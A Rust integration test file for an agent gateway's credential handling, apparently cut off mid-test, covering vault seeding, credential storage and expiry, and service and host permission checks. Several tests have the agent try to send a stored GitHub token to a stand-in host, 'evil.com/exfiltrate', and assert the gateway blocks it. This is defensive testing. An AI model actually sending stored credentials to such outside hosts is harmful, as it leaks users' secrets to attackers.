//! Integration tests for credential management.
//!
//! Run with:
//!   cargo test -p autonoetic-gateway --test credential -- --nocapture
//!
//! Vault persistence requires `AUTONOETIC_VAULT_KEY` or `AUTONOETIC_VAULT_KEY_PATH` (see `vault.rs`).


use autonoetic_gateway::policy::PolicyEngine;
use autonoetic_gateway::runtime::tools::default_registry;
use autonoetic_gateway::scheduler::gateway_store::GatewayStore;
use autonoetic_types::agent::{AgentIdentity, AgentManifest, CredentialRecord};
use autonoetic_types::capability::Capability;
use secrecy::ExposeSecret;
use std::io::{Read, Write};
use std::net::TcpListener;
use std::sync::Arc;
use std::thread;
use crate::support::manifest_builder::TestManifest;

fn test_manifest(capabilities: Vec<Capability>) -> AgentManifest {
    AgentManifest {
        agent: AgentIdentity {
            id: "test-agent".to_string(),
            name: "test-agent".to_string(),
            description: "test".to_string(),
            singleton: false,
            resident_idle_ttl_secs: None,
        },
        capabilities,
        ..TestManifest::new().build()
    }
}

fn spawn_one_shot_http_server(
    status: &str,
    content_type: &str,
    body: String,
) -> (String, thread::JoinHandle<()>) {
    let status = status.to_string();
    let content_type = content_type.to_string();
    let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
    let addr = listener
        .local_addr()
        .expect("listener should expose local addr");
    let handle = thread::spawn(move || {
        if let Ok((mut stream, _)) = listener.accept() {
            let mut request_buf = [0_u8; 2048];
            let _ = stream.read(&mut request_buf);
            let response = format!(
                "HTTP/1.1 {status}\r\nContent-Type: {content_type}\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                body.len(),
                body
            );
            let _ = stream.write_all(response.as_bytes());
            let _ = stream.flush();
        }
    });
    (format!("http://{}", addr), handle)
}

/// Seed a vault with one stored secret and point the process at it.
///
/// NOTE: `AUTONOETIC_VAULT_PATH`/`AUTONOETIC_VAULT_KEY` are process-global;
/// every test using this stays `#[serial]`, and after the gateway code has
/// run, re-read the vault via `vault_file(&temp)` (a sibling test can
/// retarget the env var mid-run).
fn setup_vault(secret_name: &str, secret_value: &str) -> tempfile::TempDir {
    let temp = tempdir().unwrap();
    let vault_path = vault_file(&temp);
    let key_hex = "000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f";
    std::env::set_var("AUTONOETIC_VAULT_KEY", key_hex);
    std::env::set_var("AUTONOETIC_VAULT_PATH", &vault_path);
    // Actually store the secret (#1053: the args used to be ignored, which
    // is why every caller was `#[ignore]`d). load_from_file creates the
    // vault on first use, and persist encrypts it to disk.
    let mut vault = autonoetic_gateway::Vault::load_from_file(&vault_path)
        .expect("vault should load");
    vault.load_secret(secret_name, secret_value.to_string());
    vault
        .persist_to_file(&vault_path)
        .expect("vault should persist");
    temp
}

/// Seed an additional secret into the vault seeded by [`setup_vault`]
/// (e.g. a refresh token under a second name).
fn vault_add_secret(vault_temp: &tempfile::TempDir, secret_name: &str, secret_value: &str) {
    let vault_path = vault_file(vault_temp);
    let mut vault = autonoetic_gateway::Vault::load_from_file(&vault_path)
        .expect("vault should load");
    vault.load_secret(secret_name, secret_value.to_string());
    vault
        .persist_to_file(&vault_path)
        .expect("vault should persist");
}

/// The vault file [`setup_vault`] pointed the gateway at. Read it back through
/// this instead of `AUTONOETIC_VAULT_PATH`: that env var is process-global and
/// a sibling test in this binary can retarget it mid-run.
fn vault_file(vault_temp: &tempfile::TempDir) -> std::path::PathBuf {
    vault_temp.path().join("vault.enc.json")
}

fn write_remote_access_any(agent_dir: &std::path::Path) {
    let skill = r#"---
metadata:
  autonoetic:
    remote_access:
      approval_mode: "required"
      targets:
        - kind: "any"
      enabled_languages: []
      python_imports: []
      js_imports: []
      rust_imports: []
      go_imports: []
      function_calls: []
      shell_commands: []
      package_manager_commands: []
---
"#;
    std::fs::write(agent_dir.join("SKILL.md"), skill).expect("skill should write");
}

fn tempdir() -> std::io::Result<tempfile::TempDir> {
    let temp = tempfile::tempdir()?;
    write_remote_access_any(temp.path());
    Ok(temp)
}

/// The `credential_onboarding.default` shape: a `remote_access` block whose
/// `targets` is empty (RFC credential-egress-host-authorization — the
/// reference agents' default).
fn write_remote_access_empty_targets(agent_dir: &std::path::Path) {
    let skill = r#"---
metadata:
  autonoetic:
    remote_access:
      approval_mode: "required"
      targets: []
      enabled_languages: []
      python_imports: []
      js_imports: []
      rust_imports: []
      go_imports: []
      function_calls: []
      shell_commands: []
      package_manager_commands: []
---
"#;
    std::fs::write(agent_dir.join("SKILL.md"), skill).expect("skill should write");
}

fn tempdir_empty_targets() -> std::io::Result<tempfile::TempDir> {
    let temp = tempfile::tempdir()?;
    write_remote_access_empty_targets(temp.path());
    Ok(temp)
}

// ---------------------------------------------------------------------------
// Storage-level tests
// ---------------------------------------------------------------------------

#[test]
#[serial_test::serial]
fn test_credential_crud() -> anyhow::Result<()> {
    let temp_dir = tempdir()?;
    let store = GatewayStore::open(temp_dir.path())?;

    let cred = CredentialRecord {
        credential_id: "cred_test_001".to_string(),
        service: "github".to_string(),
        secret_name: "GITHUB_TOKEN".to_string(),
        inject_as: Some("bearer".to_string()),
        created_by_agent: Some("coder.default".to_string()),
        expires_at: None,
        shared_with: vec![],
        allowed_hosts: vec!["api.github.com".to_string()],
        refresh_token_secret_name: None,
        refresh_url: None,
        refresh_method: None,
        refresh_headers: None,
        refresh_extract_access_token: None,
        refresh_extract_refresh_token: None,
        refresh_extract_expires_in: None,
        label: None,
    };

    store.upsert_credential(&cred)?;

    let retrieved = store
        .get_credential("cred_test_001")?
        .expect("credential should exist");
    assert_eq!(retrieved.credential_id, cred.credential_id);
    assert_eq!(retrieved.service, "github");
    assert_eq!(retrieved.allowed_hosts, vec!["api.github.com"]);

    let listed = store.list_credentials_by_service("github")?;
    assert_eq!(listed.len(), 1);
    assert_eq!(listed[0].allowed_hosts, vec!["api.github.com"]);

    let deleted = store.delete_credential("cred_test_001")?;
    assert!(deleted);
    assert!(store.get_credential("cred_test_001")?.is_none());

    Ok(())
}

#[test]
#[serial_test::serial]
fn test_credential_expiry_check() -> anyhow::Result<()> {
    let temp_dir = tempdir()?;
    let store = GatewayStore::open(temp_dir.path())?;

    let now = chrono::Utc::now();
    let expired = (now - chrono::Duration::hours(1)).to_rfc3339();
    let valid = (now + chrono::Duration::hours(24)).to_rfc3339();

    let cred_expired = CredentialRecord {
        credential_id: "cred_expired".to_string(),
        service: "stripe".to_string(),
        secret_name: "STRIPE_KEY".to_string(),
        inject_as: Some("bearer".to_string()),
        created_by_agent: None,
        expires_at: Some(expired),
        shared_with: vec![],
        allowed_hosts: vec![],
        refresh_token_secret_name: None,
        refresh_url: None,
        refresh_method: None,
        refresh_headers: None,
        refresh_extract_access_token: None,
        refresh_extract_refresh_token: None,
        refresh_extract_expires_in: None,
        label: None,
    };

    let cred_valid = CredentialRecord {
        credential_id: "cred_valid".to_string(),
        service: "stripe".to_string(),
        secret_name: "STRIPE_KEY2".to_string(),
        inject_as: Some("bearer".to_string()),
        created_by_agent: None,
        expires_at: Some(valid),
        shared_with: vec![],
        allowed_hosts: vec![],
        refresh_token_secret_name: None,
        refresh_url: None,
        refresh_method: None,
        refresh_headers: None,
        refresh_extract_access_token: None,
        refresh_extract_refresh_token: None,
        refresh_extract_expires_in: None,
        label: None,
    };

    store.upsert_credential(&cred_expired)?;
    store.upsert_credential(&cred_valid)?;

    let all = store.list_credentials_by_service("stripe")?;
    assert_eq!(all.len(), 2);

    Ok(())
}

#[test]
#[serial_test::serial]
fn test_credential_expiry_parsing() -> anyhow::Result<()> {
    let temp_dir = tempdir()?;
    let store = GatewayStore::open(temp_dir.path())?;

    let now = chrono::Utc::now();
    let expired_ts = (now - chrono::Duration::hours(1)).to_rfc3339();

    let cred = CredentialRecord {
        credential_id: "cred_check".to_string(),
        service: "test".to_string(),
        secret_name: "TEST_KEY".to_string(),
        inject_as: None,
        created_by_agent: None,
        expires_at: Some(expired_ts),
        shared_with: vec![],
        allowed_hosts: vec![],
        refresh_token_secret_name: None,
        refresh_url: None,
        refresh_method: None,
        refresh_headers: None,
        refresh_extract_access_token: None,
        refresh_extract_refresh_token: None,
        refresh_extract_expires_in: None,
        label: None,
    };

    store.upsert_credential(&cred)?;
    let listed = store.list_credentials_by_service("test")?;
    assert_eq!(listed.len(), 1);

    let parsed = chrono::DateTime::parse_from_rfc3339(listed[0].expires_at.as_ref().unwrap());
    assert!(parsed.is_ok());
    assert!(parsed.unwrap() < chrono::Utc::now());

    Ok(())
}

// ---------------------------------------------------------------------------
// Tool-level security tests
// ---------------------------------------------------------------------------

#[test]
#[serial_test::serial]
fn test_credential_check_available_with_credential_access() {
    let manifest = test_manifest(vec![Capability::CredentialAccess {
        services: vec!["github".to_string()],
    }]);
    let registry = default_registry();

    let defs = registry.available_definitions(&manifest);
    assert!(defs.iter().any(|d| d.name == "credential_check"));
}

#[test]
#[serial_test::serial]
fn test_credential_check_denied_without_credential_access() {
    let manifest = test_manifest(vec![Capability::ReadAccess {
        scopes: vec!["*".to_string()],
    }]);
    let registry = default_registry();

    let defs = registry.available_definitions(&manifest);
    assert!(!defs.iter().any(|d| d.name == "credential_check"));
}

#[test]
#[serial_test::serial]
fn test_credential_check_service_scoped_denial() {
    // Un-ignored with the working setup_vault (#1053): the old assertion
    // expected ok:true for a DENIED service, which contradicts the
    // service-scoping contract in credential.rs. Assert the real denial
    // shape instead.
    let manifest = test_manifest(vec![Capability::CredentialAccess {
        services: vec!["github".to_string()],
    }]);
    let policy = PolicyEngine::new(manifest.clone());
    let registry = default_registry();

    let temp = tempdir().unwrap();
    let store = Arc::new(GatewayStore::open(temp.path()).unwrap());

    let result = registry
        .execute(
            "credential_check",
            &manifest,
            &policy,
            temp.path(),
            None,
            &serde_json::json!({ "service": "stripe" }).to_string(),
            None,
            None,
            None,
            Some(store),
            None,
        )
        .expect("credential_check should succeed");

    let parsed: serde_json::Value = serde_json::from_str(&result).expect("valid json");
    assert_eq!(parsed["ok"], false);
    assert_eq!(parsed["error_type"], "permission");
    assert!(parsed["message"]
        .as_str()
        .unwrap()
        .contains("Credential access denied for service: stripe"));
}

#[test]
#[serial_test::serial]
fn test_credential_request_denied_wrong_service() {
    let manifest = test_manifest(vec![Capability::CredentialAccess {
        services: vec!["github".to_string()],
    }]);
    let policy = PolicyEngine::new(manifest.clone());
    let registry = default_registry();

    let temp = tempdir().unwrap();
    let store = Arc::new(GatewayStore::open(temp.path()).unwrap());

    let cred = CredentialRecord {
        credential_id: "cred_stripe_001".to_string(),
        service: "stripe".to_string(),
        secret_name: "STRIPE_KEY".to_string(),
        inject_as: Some("bearer".to_string()),
        created_by_agent: None,
        expires_at: None,
        shared_with: vec![],
        allowed_hosts: vec!["api.stripe.com".to_string()],
        refresh_token_secret_name: None,
        refresh_url: None,
        refresh_method: None,
        refresh_headers: None,
        refresh_extract_access_token: None,
        refresh_extract_refresh_token: None,
        refresh_extract_expires_in: None,
        label: None,
    };
    store.upsert_credential(&cred).unwrap();

    let result = registry
        .execute(
            "credential_request",
            &manifest,
            &policy,
            temp.path(),
            None,
            &serde_json::json!({
                "credential_id": "cred_stripe_001",
                "url": "https://api.stripe.com/v1/charges"
            })
            .to_string(),
            None,
            None,
            None,
            Some(store),
            None,
        )
        .expect("credential_request should succeed");

    let parsed: serde_json::Value = serde_json::from_str(&result).expect("valid json");
    assert_eq!(parsed["ok"], false);
    assert!(parsed["message"].as_str().unwrap().contains("Credential access denied for service: stripe"));
}

#[test]
#[serial_test::serial]
fn test_credential_request_denied_host_not_in_allowed_hosts() {
    let manifest = test_manifest(vec![
        Capability::CredentialAccess {
            services: vec!["github".to_string()],
        },
        Capability::NetworkAccess {
            hosts: vec!["api.github.com".to_string(), "evil.com".to_string()],
        },
    ]);
    let policy = PolicyEngine::new(manifest.clone());
    let registry = default_registry();

    let _vault_temp = setup_vault("GITHUB_TOKEN", "ghp_secret123");
    let temp = tempdir().unwrap();
    let store = Arc::new(GatewayStore::open(temp.path()).unwrap());

    let cred = CredentialRecord {
        credential_id: "cred_github_001".to_string(),
        service: "github".to_string(),
        secret_name: "GITHUB_TOKEN".to_string(),
        inject_as: Some("bearer".to_string()),
        created_by_agent: None,
        expires_at: None,
        shared_with: vec![],
        allowed_hosts: vec!["api.github.com".to_string()],
        refresh_token_secret_name: None,
        refresh_url: None,
        refresh_method: None,
        refresh_headers: None,
        refresh_extract_access_token: None,
        refresh_extract_refresh_token: None,
        refresh_extract_expires_in: None,
        label: None,
    };
    store.upsert_credential(&cred).unwrap();

    let result = registry
        .execute(
            "credential_request",
            &manifest,
            &policy,
            temp.path(),
            None,
            &serde_json::json!({
                "credential_id": "cred_github_001",
                "url": "https://evil.com/exfiltrate"
            })
            .to_string(),
            None,
            None,
            None,
            Some(store),
            None,
        )
        .expect("credential_request should succeed");

    let parsed: serde_json::Value = serde_json::from_str(&result).expect("valid json");
    assert_eq!(parsed["ok"], false);
    assert!(parsed["message"]
        .as_str()
        .unwrap()
        .contains("is not authorized for host 'evil.com'"));
    assert_eq!(parsed["error_type"], "permission");
}

// ---------------------------------------------------------------------------
// RFC credential-egress-host-authorization — allowed_hosts routes, never
// bypasses: a host covered by the credential turns the declaration-layer
// violation into a host approval; a host covered by nothing fails shut.
// ---------------------------------------------------------------------------

fn egress_manifest() -> AgentManifest {
    // The credential_onboarding.default capability shape.
    test_manifest(vec![
        Capability::CredentialAccess {
            services: vec!["github".to_string()],
        },
        Capability::NetworkAccess {
            hosts: vec!["*".to_string()],
        },
    ])
}

fn egress_credential(allowed_hosts: Vec<String>) -> CredentialRecord {
    CredentialRecord {
        credential_id: "cred_egress_001".to_string(),
        service: "github".to_string(),
        secret_name: "GITHUB_TOKEN".to_string(),
        inject_as: Some("bearer".to_string()),
        created_by_agent: None,
        expires_at: None,
        shared_with: vec![],
        allowed_hosts,
        refresh_token_secret_name: None,
        refresh_url: None,
        refresh_method: None,
        refresh_headers: None,
        refresh_extract_access_token: None,
        refresh_extract_refresh_token: None,
        refresh_extract_expires_in: None,
        label: None,
    }
}

fn run_credential_request(
    registry: &autonoetic_gateway::runtime::tools::NativeToolRegistry,
    manifest: &AgentManifest,
    policy: &PolicyEngine,
    agent_dir: &std::path::Path,
    store: &Arc<GatewayStore>,
    url: &str,
) -> serde_json::Value {
    let result = registry
        .execute(
            "credential_request",
            manifest,
            policy,
            agent_dir,
            None,
            &serde_json::json!({
                "credential_id": "cred_egress_001",
                "url": url
            })
            .to_string(),
            Some("egress-test-session"),
            None,
            None,
            Some(store.clone()),
            None,
        )
        .expect("credential_request should execute");
    serde_json::from_str(&result).expect("valid json")
}

#[test]
#[serial_test::serial]
fn test_credential_request_uncovered_host_fails_shut_without_declaration() {
    // Empty-targets declaration (the onboarding shape) + a host the
    // credential does NOT cover: hard error, no gate minted. The denial is
    // a credential-scope violation (permission) regardless of which policy
    // layer tripped first — one failure mode for out-of-scope hosts.
    let manifest = egress_manifest();
    let policy = PolicyEngine::new(manifest.clone());
    let registry = default_registry();
    let temp = tempdir_empty_targets().unwrap();
    let store = Arc::new(GatewayStore::open(temp.path()).unwrap());
    store
        .upsert_credential(&egress_credential(vec!["api.github.com".to_string()]))
        .unwrap();

    let parsed = run_credential_request(
        &registry,
        &manifest,
        &policy,
        temp.path(),
        &store,
        "https://evil.com/exfiltrate",
    );

    assert_eq!(parsed["ok"], false);
    assert_eq!(
        parsed["error_type"], "permission",
        "out-of-scope host must read as a credential-scope violation, got: {parsed}"
    );
    assert!(parsed["message"]
        .as_str()
        .unwrap()
        .contains("is not authorized for host 'evil.com'"));
    assert!(parsed.get("approval_required").is_none());
    // And nothing was minted.
    assert!(store.get_pending_approvals().unwrap().is_empty());
}

#[test]
#[serial_test::serial]
fn test_credential_request_covered_host_mints_host_approval() {
    // The same empty-targets declaration, but the URL host IS covered by
    // the credential's allowed_hosts: instead of the fail-shut declaration
    // error, a host approval is minted (RFC: route, don't bypass).
    let manifest = egress_manifest();
    let policy = PolicyEngine::new(manifest.clone());
    let registry = default_registry();
    let temp = tempdir_empty_targets().unwrap();
    let store = Arc::new(GatewayStore::open(temp.path()).unwrap());
    store
        .upsert_credential(&egress_credential(vec!["api.github.com".to_string()]))
        .unwrap();

    let parsed = run_credential_request(
        &registry,
        &manifest,
        &policy,
        temp.path(),
        &store,
        "https://api.github.com/repos/rust-lang/rust",
    );

    assert_eq!(
        parsed["ok"], false,
        "must not silently succeed without an approval: {parsed}"
    );
    assert_eq!(parsed["approval_required"], true);
    assert_eq!(parsed["suspended"], true);
    let request_id = parsed["request_id"].as_str().expect("request_id");
    assert!(!request_id.is_empty());
    // The minted card names the host and the service (not just "credential
    // request to X"), and the host approval exists in the store.
    let pending = store.get_pending_approvals().unwrap();
    let minted = pending
        .iter()
        .find(|p| p.request_id == request_id)
        .expect("approval row should exist");
    match &minted.action {
        autonoetic_types::background::ScheduledAction::CredentialRequest {
            payload, url, ..
        } => {
            let host = payload
                .as_ref()
                .and_then(|p| p.get("host"))
                .and_then(|v| v.as_str());
            assert_eq!(host, Some("api.github.com"));
            assert!(url.starts_with("https://api.github.com/"));
        }
        other => panic!("expected CredentialRequest action, got {other:?}"),
    }
}

#[test]
#[serial_test::serial]
fn test_credential_request_wildcard_allowed_hosts_covers_any_host() {
    // allowed_hosts: ["*"] is an explicit operator-granted wildcard: the
    // declaration gap routes to the approval, which is then the only thing
    // standing between the secret and the host.
    let manifest = egress_manifest();
    let policy = PolicyEngine::new(manifest.clone());
    let registry = default_registry();
    let temp = tempdir_empty_targets().unwrap();
    let store = Arc::new(GatewayStore::open(temp.path()).unwrap());
    store
        .upsert_credential(&egress_credential(vec!["*".to_string()]))
        .unwrap();

    let parsed = run_credential_request(
        &registry,
        &manifest,
        &policy,
        temp.path(),
        &store,
        "https://api.github.com/repos/rust-lang/rust",
    );

    assert_eq!(parsed["approval_required"], true);
    assert_eq!(parsed["suspended"], true);
}

#[test]
#[serial_test::serial]
fn test_credential_request_allowed_when_host_matches() {
    let manifest = test_manifest(vec![
        Capability::CredentialAccess {
            services: vec!["github".to_string()],
        },
        Capability::NetworkAccess {
            hosts: vec!["127.0.0.1".to_string()],
        },
    ]);
    let policy = PolicyEngine::new(manifest.clone());
    let registry = default_registry();

    let _vault_temp = setup_vault("GITHUB_TOKEN", "ghp_secret123");
    let temp = tempdir().unwrap();
    let store = Arc::new(GatewayStore::open(temp.path()).unwrap());

    let (url, handle) = spawn_one_shot_http_server("200 OK", "text/plain", "ok".to_string());
    let host = url::Url::parse(&url)
        .unwrap()
        .host_str()
        .unwrap()
        .to_string();

    let cred = CredentialRecord {
        credential_id: "cred_gh_local".to_string(),
        service: "github".to_string(),
        secret_name: "GITHUB_TOKEN".to_string(),
        inject_as: Some("header:X-Custom-Auth".to_string()),
        created_by_agent: None,
        expires_at: None,
        shared_with: vec![],
        allowed_hosts: vec![host.clone()],
        refresh_token_secret_name: None,
        refresh_url: None,
        refresh_method: None,
        refresh_headers: None,
        refresh_extract_access_token: None,
        refresh_extract_refresh_token: None,
        refresh_extract_expires_in: None,
        label: None,
    };
    store.upsert_credential(&cred).unwrap();

    let result = registry
        .execute(
            "credential_request",
            &manifest,
            &policy,
            temp.path(),
            None,
            &serde_json::json!({
                "credential_id": "cred_gh_local",
                "url": format!("{}/api", url),
                "inject_secret_as": "bearer"
            })
            .to_string(),
            None,
            None,
            None,
            Some(store),
            None,
        )
        .expect("credential_request should succeed");

    let parsed: serde_json::Value = serde_json::from_str(&result).expect("valid json");
    assert_eq!(parsed["ok"], true);

    handle.join().expect("server thread should join");
}

#[test]
#[serial_test::serial]
fn test_credential_request_stored_inject_as_takes_precedence() {
    let manifest = test_manifest(vec![
        Capability::CredentialAccess {
            services: vec!["github".to_string()],
        },
        Capability::NetworkAccess {
            hosts: vec!["127.0.0.1".to_string()],
        },
    ]);
    let policy = PolicyEngine::new(manifest.clone());
    let registry = default_registry();

    let _vault_temp = setup_vault("GITHUB_TOKEN", "ghp_secret123");
    let temp = tempdir().unwrap();
    let store = Arc::new(GatewayStore::open(temp.path()).unwrap());

    let (url, handle) = spawn_one_shot_http_server("200 OK", "text/plain", "ok".to_string());
    let host = url::Url::parse(&url)
        .unwrap()
        .host_str()
        .unwrap()
        .to_string();

    let cred = CredentialRecord {
        credential_id: "cred_inject_precedence".to_string(),
        service: "github".to_string(),
        secret_name: "GITHUB_TOKEN".to_string(),
        inject_as: Some("header:X-Custom-Auth".to_string()),
        created_by_agent: None,
        expires_at: None,
        shared_with: vec![],
        allowed_hosts: vec![host.clone()],
        refresh_token_secret_name: None,
        refresh_url: None,
        refresh_method: None,
        refresh_headers: None,
        refresh_extract_access_token: None,
        refresh_extract_refresh_token: None,
        refresh_extract_expires_in: None,
        label: None,
    };
    store.upsert_credential(&cred).unwrap();

    let result = registry
        .execute(
            "credential_request",
            &manifest,
            &policy,
            temp.path(),
            None,
            &serde_json::json!({
                "credential_id": "cred_inject_precedence",
                "url": format!("{}/api", url),
                "inject_secret_as": "bearer"
            })
            .to_string(),
            None,
            None,
            None,
            Some(store),
            None,
        )
        .expect("credential_request should succeed");

    let parsed: serde_json::Value = serde_json::from_str(&result).expect("valid json");
    assert_eq!(parsed["ok"], true);

    handle.join().expect("server thread should join");
}

#[test]
#[serial_test::serial]
fn test_credential_request_no_allowed_hosts_uses_network_access_only() {
    let manifest = test_manifest(vec![
        Capability::CredentialAccess {
            services: vec!["github".to_string()],
        },
        Capability::NetworkAccess {
            hosts: vec!["127.0.0.1".to_string()],
        },
    ]);
    let policy = PolicyEngine::new(manifest.clone());
    let registry = default_registry();

    let _vault_temp = setup_vault("GITHUB_TOKEN", "ghp_secret123");
    let temp = tempdir().unwrap();
    let store = Arc::new(GatewayStore::open(temp.path()).unwrap());

    let (url, handle) = spawn_one_shot_http_server(
        "200 OK",
        "application/json",
        r#"{"status":"ok"}"#.to_string(),
    );
    let _host = url::Url::parse(&url)
        .unwrap()
        .host_str()
        .unwrap()
        .to_string();

    let cred = CredentialRecord {
        credential_id: "cred_no_host_binding".to_string(),
        service: "github".to_string(),
        secret_name: "GITHUB_TOKEN".to_string(),
        inject_as: Some("bearer".to_string()),
        created_by_agent: None,
        expires_at: None,
        shared_with: vec![],
        allowed_hosts: vec![],
        refresh_token_secret_name: None,
        refresh_url: None,
        refresh_method: None,
        refresh_headers: None,
        refresh_extract_access_token: None,
        refresh_extract_refresh_token: None,
        refresh_extract_expires_in: None,
        label: None,
    };
    store.upsert_credential(&cred).unwrap();

    let result = registry
        .execute(
            "credential_request",
            &manifest,
            &policy,
            temp.path(),
            None,
            &serde_json::json!({
                "credential_id": "cred_no_host_binding",
                "url": format!("{}/api", url)
            })
            .to_string(),
            None,
            None,
            None,
            Some(store),
            None,
        )
        .expect("credential_request should succeed");

    let parsed: serde_json::Value = serde_json::from_str(&result).expect("valid json");
    assert_eq!(parsed["ok"], true);

    handle.join().expect("server thread should join");
}

#[test]
#[serial_test::serial]
fn test_credential_request_denied_expired() {
    let manifest = test_manifest(vec![
        Capability::CredentialAccess {
            services: vec!["github".to_string()],
        },
        Capability::NetworkAccess {
            hosts: vec!["127.0.0.1".to_string()],
        },
    ]);
    let policy = PolicyEngine::new(manifest.clone());
    let registry = default_registry();

    let _vault_temp = setup_vault("GITHUB_TOKEN", "ghp_secret123");
    let temp = tempdir().unwrap();
    let store = Arc::new(GatewayStore::open(temp.path()).unwrap());

    let expired_ts = (chrono::Utc::now() - chrono::Duration::hours(1)).to_rfc3339();

    let cred = CredentialRecord {
        credential_id: "cred_expired_001".to_string(),
        service: "github".to_string(),
        secret_name: "GITHUB_TOKEN".to_string(),
        inject_as: Some("bearer".to_string()),
        created_by_agent: None,
        expires_at: Some(expired_ts),
        shared_with: vec![],
        allowed_hosts: vec!["127.0.0.1".to_string()],
        refresh_token_secret_name: None,
        refresh_url: None,
        refresh_method: None,
        refresh_headers: None,
        refresh_extract_access_token: None,
        refresh_extract_refresh_token: None,
        refresh_extract_expires_in: None,
        label: None,
    };
    store.upsert_credential(&cred).unwrap();

    let result = registry
        .execute(
            "credential_request",
            &manifest,
            &policy,
            temp.path(),
            None,
            &serde_json::json!({
                "credential_id": "cred_expired_001",
                "url": "http://127.0.0.1:9999/api"
            })
            .to_string(),
            None,
            None,
            None,
            Some(store),
            None,
        )
        .expect("credential_request should succeed");

    let parsed: serde_json::Value = serde_json::from_str(&result).expect("valid json");
    assert_eq!(parsed["ok"], false);
    assert!(parsed["message"]
        .as_str()
        .unwrap()
        .contains("Credential expired at"));
    assert_eq!(parsed["error_type"], "resource");
}

#[test]
#[serial_test::serial]
fn test_credential_request_denied_malformed_expiry() {
    let manifest = test_manifest(vec![
        Capability::CredentialAccess {
            services: vec!["github".to_string()],
        },
        Capability::NetworkAccess {
            hosts: vec!["127.0.0.1".to_string()],
        },
    ]);
    let policy = PolicyEngine::new(manifest.clone());
    let registry = default_registry();

    let _vault_temp = setup_vault("GITHUB_TOKEN", "ghp_secret123");
    let temp = tempdir().unwrap();
    let store = Arc::new(GatewayStore::open(temp.path()).unwrap());

    let cred = CredentialRecord {
        credential_id: "cred_bad_expiry".to_string(),
        service: "github".to_string(),
        secret_name: "GITHUB_TOKEN".to_string(),
        inject_as: Some("bearer".to_string()),
        created_by_agent: None,
        expires_at: Some("not-a-timestamp".to_string()),
        shared_with: vec![],
        allowed_hosts: vec!["127.0.0.1".to_string()],
        refresh_token_secret_name: None,
        refresh_url: None,
        refresh_method: None,
        refresh_headers: None,
        refresh_extract_access_token: None,
        refresh_extract_refresh_token: None,
        refresh_extract_expires_in: None,
        label: None,
    };
    store.upsert_credential(&cred).unwrap();

    let result = registry
        .execute(
            "credential_request",
            &manifest,
            &policy,
            temp.path(),
            None,
            &serde_json::json!({
                "credential_id": "cred_bad_expiry",
                "url": "http://127.0.0.1:9999/api"
            })
            .to_string(),
            None,
            None,
            None,
            Some(store),
            None,
        )
        .expect("credential_request should succeed");

    let parsed: serde_json::Value = serde_json::from_str(&result).expect("valid json");
    assert_eq!(parsed["ok"], false);
    assert!(parsed["message"]
        .as_str()
        .unwrap()
        .contains("unparseable expiry timestamp"));
    assert_eq!(parsed["error_type"], "validation");
}

#[test]
#[serial_test::serial]
fn test_credential_request_denied_network_policy() {
    let manifest = test_manifest(vec![
        Capability::CredentialAccess {
            services: vec!["github".to_string()],
        },
        Capability::NetworkAccess {
            hosts: vec!["api.github.com".to_string()],
        },
    ]);
    let policy = PolicyEngine::new(manifest.clone());
    let registry = default_registry();

    let _vault_temp = setup_vault("GITHUB_TOKEN", "ghp_secret123");
    let temp = tempdir().unwrap();
    let store = Arc::new(GatewayStore::open(temp.path()).unwrap());

    let cred = CredentialRecord {
        credential_id: "cred_net_denied".to_string(),
        service: "github".to_string(),
        secret_name: "GITHUB_TOKEN".to_string(),
        inject_as: Some("bearer".to_string()),
        created_by_agent: None,
        expires_at: None,
        shared_with: vec![],
        allowed_hosts: vec!["api.github.com".to_string(), "evil.com".to_string()],
        refresh_token_secret_name: None,
        refresh_url: None,
        refresh_method: None,
        refresh_headers: None,
        refresh_extract_access_token: None,
        refresh_extract_refresh_token: None,
        refresh_extract_expires_in: None,
        label: None,
    };
    store.upsert_credential(&cred).unwrap();

    let result = registry
        .execute(
            "credential_request",
            &manifest,
            &policy,
            temp.path(),
            None,
            &serde_json::json!({
                "credential_id": "cred_net_denied",
                "url": "https://evil.com/exfil"
            })
            .to_string(),
            None,
            None,
            None,
            Some(store),
            None,
        )
        .expect("credential_request should succeed");

    let parsed: serde_json::Value = serde_json::from_str(&result).expect("valid json");
    assert_eq!(parsed["ok"], false);
    assert_eq!(parsed["approval_required"].as_bool(), Some(true), "network policy should block pending approval");
}

#[test]
#[serial_test::serial]
fn test_credential_setup_available_with_credential_access() {
    let manifest = test_manifest(vec![Capability::CredentialAccess {
        services: vec!["github".to_string()],
    }]);
    let registry = default_registry();

    let defs = registry.available_definitions(&manifest);
    assert!(defs.iter().any(|d| d.name == "credential_setup"));
}

#[test]
#[serial_test::serial]
fn test_credential_setup_denied_without_credential_access() {
    let manifest = test_manifest(vec![Capability::ReadAccess {
        scopes: vec!["*".to_string()],
    }]);
    let registry = default_registry();

    let defs = registry.available_definitions(&manifest);
    assert!(!defs.iter().any(|d| d.name == "credential_setup"));
}

#[test]
#[serial_test::serial]
fn test_credential_setup_denied_wrong_service() {
    let manifest = test_manifest(vec![Capability::CredentialAccess {
        services: vec!["github".to_string()],
    }]);
    let policy = PolicyEngine::new(manifest.clone());
    let registry = default_registry();

    let _vault_temp = setup_vault("DUMMY", "dummy");
    let temp = tempdir().unwrap();
    let store = Arc::new(GatewayStore::open(temp.path()).unwrap());

    let result = registry
        .execute(
            "credential_setup",
            &manifest,
            &policy,
            temp.path(),
            None,
            &serde_json::json!({
                "service": "stripe",
                "steps": [{
                    "step_type": "user_action",
                    "instruction": "Go to stripe.com"
                }]
            })
            .to_string(),
            None,
            None,
            None,
            Some(store),
            None,
        )
        .expect("credential_setup should succeed");

    let parsed: serde_json::Value = serde_json::from_str(&result).expect("valid json");
    assert_eq!(parsed["ok"], false);
    assert!(parsed["message"]
        .as_str()
        .unwrap()
        .contains("Credential setup denied for service: stripe"));
    assert_eq!(parsed["error_type"], "permission");
}

#[test]
#[serial_test::serial]
fn test_credential_setup_denied_network_policy() {
    let manifest = test_manifest(vec![
        Capability::CredentialAccess {
            services: vec!["github".to_string()],
        },
        Capability::NetworkAccess {
            hosts: vec!["api.github.com".to_string()],
        },
    ]);
    let policy = PolicyEngine::new(manifest.clone());
    let registry = default_registry();

    let _vault_temp = setup_vault("DUMMY", "dummy");
    let temp = tempdir().unwrap();
    let store = Arc::new(GatewayStore::open(temp.path()).unwrap());

    let result = registry
        .execute(
            "credential_setup",
            &manifest,
            &policy,
            temp.path(),
            None,
            &serde_json::json!({
                "service": "github",
